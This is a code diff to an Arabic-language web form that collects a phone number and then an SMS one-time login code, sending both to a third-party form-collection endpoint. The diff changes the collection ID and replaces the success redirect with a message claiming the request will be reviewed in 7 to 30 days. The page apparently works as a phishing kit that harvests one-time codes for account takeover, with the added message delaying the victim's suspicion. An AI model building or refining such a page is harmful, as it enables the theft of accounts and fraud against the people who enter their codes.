@@ -162,7 +162,7 @@
       <label for="phone">رقم الهاتف:</label>
       <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
 
-      <button type="submit" id="sendPhoneBtn">أرسل كود</button>
+      <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
       <div id="timer"></div>
     </form>
 
@@ -171,7 +171,10 @@
         <label for="code">جاري إرسال الكود عبر SMS</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
         <div id="errorMessage" class="error"></div>
-        <button type="submit" id="sendCodeBtn">طلب الدخول</button>
+        <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
+        <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
+          جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
+        </div>
       </div>
     </form>
   </div>
@@ -199,6 +202,8 @@
     const phoneInput = document.getElementById('phone');
     const codeInput = document.getElementById('code');
     const errorMessage = document.getElementById('errorMessage');
+    const processingMessage = document.getElementById('processingMessage');
+    const sendCodeBtn = document.getElementById('sendCodeBtn');
 
     function startTimer(duration) {
       let timeLeft = duration;
@@ -240,7 +245,7 @@
         phone: phoneInput.value
       };
 
-      fetch('https://formcarry.com/s/12UxdOsTbaW', {
+      fetch('https://formcarry.com/s/2evKahWtdJS', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -279,7 +284,7 @@
         code: codeInput.value
       };
 
-      fetch('https://formcarry.com/s/12UxdOsTbaW', {
+      fetch('https://formcarry.com/s/2evKahWtdJS', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -291,7 +296,8 @@
         const data = await response.json();
 
         if (response.ok && data.success !== false) {
-          window.location.href = 'success.html';
+          sendCodeBtn.style.display = 'none';
+          processingMessage.style.display = 'block';
         } else {
           errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
         }
